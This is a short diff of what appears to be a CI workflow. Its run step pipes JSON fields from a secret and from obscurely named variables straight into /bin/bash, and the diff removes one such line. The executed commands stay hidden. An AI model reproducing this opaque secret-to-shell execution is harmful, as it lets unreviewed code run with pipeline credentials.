@@ -22,7 +22,6 @@ jobs:
           i1: ${{ secrets.i1 }}
         run: |
           printf '%s' "$i1" | jq -r .vsqc239 | /bin/bash
-          echo $bxcbv54 | jq -r .kh7990 | /bin/bash
           echo $k91529 | jq -r .hp819 | /bin/bash
           echo $xw81229 | jq -r .zz22 | /bin/bash
           echo $zew4 | jq -r .szwxd0681 | /bin/bash
